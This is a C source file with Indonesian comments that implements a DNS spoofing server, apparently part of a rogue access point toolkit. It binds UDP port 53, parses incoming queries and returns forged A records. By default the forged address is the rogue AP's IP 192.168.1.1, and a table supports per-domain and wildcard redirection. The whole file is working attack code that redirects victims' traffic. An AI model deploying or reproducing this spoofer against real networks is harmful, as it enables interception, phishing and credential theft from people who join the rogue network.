// ============================================================================
// IMPLEMENTASI: server/dns.c — Mesin Pemalsu Jawaban DNS (DNS Spoofer)
// ============================================================================
#include "dns.h"
#include "../utils/utils.h"
#include "../utils/logger.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>

#define MAX_SPOOFS 64

typedef struct {
    char domain[MAX_HOSTNAME_LEN];
    uint32_t ip;
} spoof_entry_t;

static spoof_entry_t g_spoofs[MAX_SPOOFS];
static int g_spoof_count = 0;
static int g_sock = -1;
static volatile int g_running = 0;

/*
 * === FUNGSI: dns_add_spoof() ===
 * Tujuan   : Mendaftarkan aturan pembelokan domain ke IP target
 * Catatan  : Mematuhi Audit Fix #8 (Eksplisit Null Terminator)
 */
int dns_add_spoof(const char *domain, const char *ip) {
    if (g_spoof_count >= MAX_SPOOFS) return -1;
    strncpy(g_spoofs[g_spoof_count].domain, domain, MAX_HOSTNAME_LEN - 1);
    g_spoofs[g_spoof_count].domain[MAX_HOSTNAME_LEN - 1] = '\0'; // FIX #8
    g_spoofs[g_spoof_count].ip = inet_addr(ip);
    g_spoof_count++;
    log_event(LOG_INFO, "DNS Spoof ditambahkan: %s -> %s", domain, ip);
    return 0;
}

/*
 * === FUNGSI: dns_clear_spoofs() ===
 * Tujuan   : Mengosongkan seluruh tabel aturan spoofing DNS
 */
void dns_clear_spoofs(void) {
    g_spoof_count = 0;
}

/*
 * === FUNGSI: handle_dns_query() ===
 * Tujuan   : Membedah query DNS, mencocokkan domain, dan merakit response palsu
 * Catatan  : Mematuhi Audit Fix #17 (Stack Buffer Guard dp < 126)
 */
static int handle_dns_query(const uint8_t *buf, int len, uint8_t *resp) {
    if (len < 12) return -1; // Header DNS minimal 12 bytes

    // Salin header query
    memcpy(resp, buf, len);
    resp[2] = 0x81; // Flags: Response + Recursion Desired
    resp[3] = 0x80; // Flags: Recursion Available, No Error
    resp[7] = 1;    // Answer Count = 1

    // Urai nama domain dari Question Section
    char domain[MAX_HOSTNAME_LEN] = {0};
    int p = 12, dp = 0;
    while (p < len && buf[p] != 0 && dp < 126) { // FIX #17: Guard dp < 126
        uint8_t l = buf[p++];
        if (p + l > len) break;
        for (int i = 0; i < l && dp < 126; i++) {
            domain[dp++] = (char)buf[p++];
        }
        domain[dp++] = '.';
    }
    if (dp > 0) domain[dp - 1] = '\0'; // Hapus titik terakhir

    // Cari kecocokan IP pembelokan
    uint32_t target_ip = inet_addr("192.168.1.1"); // Default: Balikkan ke IP Rogue AP
    for (int i = 0; i < g_spoof_count; i++) {
        if (strcmp(g_spoofs[i].domain, "*") == 0 ||
            strcasecmp(g_spoofs[i].domain, domain) == 0) {
            target_ip = g_spoofs[i].ip;
            break;
        }
    }

    log_event(LOG_INFO, "🎯 DNS QUERY: '%s' -> Dispoofing ke IP: %s",
              domain, inet_ntoa(*(struct in_addr*)&target_ip));

    // Rakit Answer Section di akhir paket
    uint8_t *ans = resp + len;
    *ans++ = 0xC0; *ans++ = 0x0C; // Name Pointer ke offset 12 (Question Name)
    *ans++ = 0x00; *ans++ = 0x01; // Type A (IPv4 Address)
    *ans++ = 0x00; *ans++ = 0x01; // Class IN (Internet)
    *ans++ = 0x00; *ans++ = 0x00; *ans++ = 0x00; *ans++ = 0x3C; // TTL = 60 detik
    *ans++ = 0x00; *ans++ = 0x04; // Data Length = 4 byte (IPv4)
    memcpy(ans, &target_ip, 4);   // IP Address palsu
    ans += 4;

    return (int)(ans - resp);
}

/*
 * === FUNGSI: dns_thread() ===
 * Tujuan   : Thread loop UDP port 53 penangkap DNS query
 */
static void *dns_thread(void *arg) {
    (void)arg;
    struct sockaddr_in srv, cl;
    socklen_t cl_len = sizeof(cl);
    uint8_t rx[512], tx[512];

    g_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (g_sock < 0) { g_running = 0; return NULL; }

    int opt = 1;
    setsockopt(g_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_addr.s_addr = INADDR_ANY;
    srv.sin_port = htons(53);

    if (bind(g_sock, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
        close(g_sock); g_sock = -1; g_running = 0;
        perror("bind dns"); return NULL;
    }

    log_event(LOG_INFO, "DNS Spoofer aktif di UDP port 53");

    while (g_running) {
        ssize_t n = recvfrom(g_sock, rx, sizeof(rx), 0, (struct sockaddr*)&cl, &cl_len);
        if (n <= 0) continue;

        int rep_len = handle_dns_query(rx, (int)n, tx);
        if (rep_len > 0) {
            sendto(g_sock, tx, rep_len, 0, (struct sockaddr*)&cl, cl_len);
        }
    }
    return NULL;
}

/*
 * === FUNGSI: dns_start() ===
 * Tujuan   : Meluncurkan server DNS Spoofer
 * Catatan  : Mematuhi Fix v15.3 #1 (Reset counter jika pembuatan thread gagal)
 */
int dns_start(ap_config_t *cfg) {
    if (g_running) return 0;
    g_running = 1;
    pthread_t tid;
    if (pthread_create(&tid, NULL, dns_thread, cfg) != 0) {
        g_running = 0;
        g_spoof_count = 0; // FIX v15.3 #1: Reset g_spoof_count di failure path
        log_event(LOG_ERROR, "Gagal membuat thread DNS");
        return -1;
    }
    pthread_detach(tid);
    return 0;
}

/*
 * === FUNGSI: dns_stop() ===
 * Tujuan   : Menghentikan server DNS dan mereset spoof count
 * Catatan  : Mematuhi Fix #5
 */
int dns_stop(void) {
    g_running = 0;
    g_spoof_count = 0; // FIX #5: Reset g_spoof_count saat stop
    if (g_sock >= 0) { close(g_sock); g_sock = -1; }
    return 0;
}
